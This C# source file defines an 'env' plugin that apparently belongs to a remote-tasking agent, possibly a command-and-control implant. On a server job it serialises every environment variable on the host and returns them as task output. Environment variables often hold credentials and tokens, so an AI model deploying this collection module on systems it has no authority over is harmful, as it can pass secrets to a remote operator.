using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;

namespace Agent.Plugins
{
    public class Env : IPlugin
    {
        public string Name => "env";
        public IAgentConfig config { get; set; }
        public IMessageManager messageManager { get; set; }
        public ILogger logger { get; set; }
        public ITokenManager tokenManager { get; set; }

        public Env(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.config = config;
            this.logger = logger;
            this.tokenManager = tokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            string output = JsonSerializer.Serialize(Environment.GetEnvironmentVariables());

            await messageManager.AddResponse(new ResponseResult()
            {
                task_id = job.task.id,
                user_output = output,
                completed = true
            });
        }
    }
}
